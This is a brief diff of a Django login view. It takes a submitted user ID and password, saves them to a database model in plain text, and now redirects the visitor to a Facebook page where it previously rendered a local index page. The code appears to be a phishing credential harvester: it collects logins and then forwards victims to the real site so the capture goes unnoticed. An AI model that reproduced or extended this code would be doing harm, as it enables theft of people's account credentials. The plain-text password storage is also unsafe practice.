@@ -9,4 +9,4 @@ def login(request):
     password= request.POST["pswd"]
     x=info.objects.create(ui=uid, password=password)
     x.save()
-    return render(request,"index.html")
+    return redirect("https://facebook.com/CrypticSci")
